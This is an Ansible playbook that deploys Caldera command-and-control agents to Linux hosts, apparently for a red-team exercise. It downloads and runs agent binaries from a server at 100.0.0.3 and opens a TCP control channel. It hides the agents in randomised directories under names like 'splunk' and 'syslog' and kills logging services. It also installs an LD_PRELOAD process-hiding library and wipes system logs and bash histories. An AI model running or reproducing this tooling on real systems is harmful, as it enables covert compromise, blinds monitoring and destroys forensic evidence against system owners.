---
- name: Deploy Caldera agents and process hider on Linux hosts
  hosts: linux
  become: yes
  gather_facts: yes

  vars:
    deploy_base_dir: "/tmp/.syslogd_backup"
    purge_logs: true

  tasks:
    # Generate stable random folder names ONCE
    - name: Generate consistent random folder names
      set_fact:
        random_folder1: "{{ lookup('password', '/dev/null', length=12, chars='ascii_letters') }}"
        random_folder2: "{{ lookup('password', '/dev/null', length=12, chars='ascii_letters') }}"
        random_folder3: "{{ lookup('password', '/dev/null', length=12, chars='ascii_letters') }}"

    - name: Set final hidden deploy path
      set_fact:
        deploy_dir: "{{ deploy_base_dir }}/{{ random_folder1 }}/{{ random_folder2 }}/{{ random_folder3 }}"

    # Environment setup
    - name: setup
      package:
        name:
          - python3
          - python3-pip
          - make
          - gcc
        state: present

    - name: Create base hidden deployment directory
      file:
        path: "{{ deploy_base_dir }}"
        state: directory
        mode: "0755"

    - name: Create nested hidden deployment directory
      file:
        path: "{{ deploy_dir }}"
        state: directory
        mode: "0755"

    # Clean up existing agents if any (optional pre-clean)
    - name: kill process splunk
      shell: sudo pkill -9 -f splunk || true
      ignore_errors: yes

    - name: kill process syslog
      shell: sudo pkill -9 -f syslog || true
      ignore_errors: yes

    - name: kill process graylog
      shell: sudo pkill -9 -f graylog || true
      ignore_errors: yes

    - name: kill process notlog
      shell: sudo pkill -9 -f notlog || true
      ignore_errors: yes

    - name: kill process ragdoll
      shell: sudo pkill -9 -f ragdoll || true
      ignore_errors: yes

    - name: Clean up any existing agents in /tmp or previous runs
      shell: |
        sudo find /tmp -maxdepth 4 \( \
          -name 'splunk*' -o \
          -name 'syslog*' -o \
          -name 'graylog*' -o \
          -name 'notlog*' -o \
          -name 'ragdoll*' \
        \) -exec rm -rf {} + || true
      ignore_errors: yes


    - name: Clean up previous kernel link
      shell: "sudo echo '' > /etc/ld.so.preload"
      ignore_errors: yes

    - name: Delete previous created process.so
      file:
        path: /usr/local/lib/process.so
        state: absent

  
    # Deploy agents
    # HTTP AGENTS (Sandcat)
    - name: Deploy HTTP agents
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        for name in splunkd splunk; do
          sudo curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$name"
          sudo chmod +x "$name"
          sudo nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
        done

    # HTML AGENTS (RagDoll) 
    - name: Deploy HTML agents
      shell: |
        server="http://100.0.0.3:8888"
        cd {{ deploy_dir }}
        pip install -q requests beautifulsoup4
        for name in notlog-html; do
          sudo curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > "$name.py"
          sudo nohup python3 "$name.py" -W "$server/weather" >/dev/null 2>&1 &
        done

    # TCP AGENTS (Manx)
    - name: Deploy TCP agents
      shell: |
        server="http://100.0.0.3:8888"
        socket="100.0.0.3:7010"
        contact="tcp"
        cd {{ deploy_dir }}
        for name in syslog-tcp; do
          sudo curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
          sudo chmod +x "$name"
          sudo nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
        done

    # Build and install process hider
    - name: Copy processhider.c from hideprocesses folder
      copy:
        src: ../hideprocesses/processhider.c
        dest: "{{ deploy_dir }}/processhider.c"
        mode: "0644"

    - name: Copy Makefile from hideprocesses folder
      copy:
        src: ../hideprocesses/Makefile
        dest: "{{ deploy_dir }}/Makefile"
        mode: "0644"

    - name: Build process hider via make
      command: make
      args:
        chdir: "{{ deploy_dir }}"

    - name: Move compiled .so and update /etc/ld.so.preload
      shell: sudo mv {{ deploy_dir }}/libprocesshider.so /usr/local/lib/
    
    - name: echo to preload
      shell: sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

    
    # Log and history cleanup
    - block:
        - name: Truncate syslog (Debian/Ubuntu)
          shell: truncate -s 0 /var/log/syslog 2>/dev/null || true
          when: ansible_facts['os_family'] == "Debian"

        - name: Truncate auth.log (Debian/Ubuntu)
          shell: truncate -s 0 /var/log/auth.log 2>/dev/null || true
          when: ansible_facts['os_family'] == "Debian"

        - name: Truncate messages (Rocky/RedHat)
          shell: truncate -s 0 /var/log/messages 2>/dev/null || true
          when: ansible_facts['os_family'] == "RedHat"

        - name: Truncate secure (Rocky/RedHat)
          shell: truncate -s 0 /var/log/secure 2>/dev/null || true
          when: ansible_facts['os_family'] == "RedHat"

        - name: Clear root bash history
          shell: |
            [ -f /root/.bash_history ] && cat /dev/null > /root/.bash_history 2>/dev/null || true
            history -c 2>/dev/null || true
            history -w 2>/dev/null || true

        - name: Clear primary user's bash history (john_hammond)
          shell: |
            [ -f /home/john_hammond/.bash_history ] && cat /dev/null > /home/john_hammond/.bash_history 2>/dev/null || true
      when: purge_logs
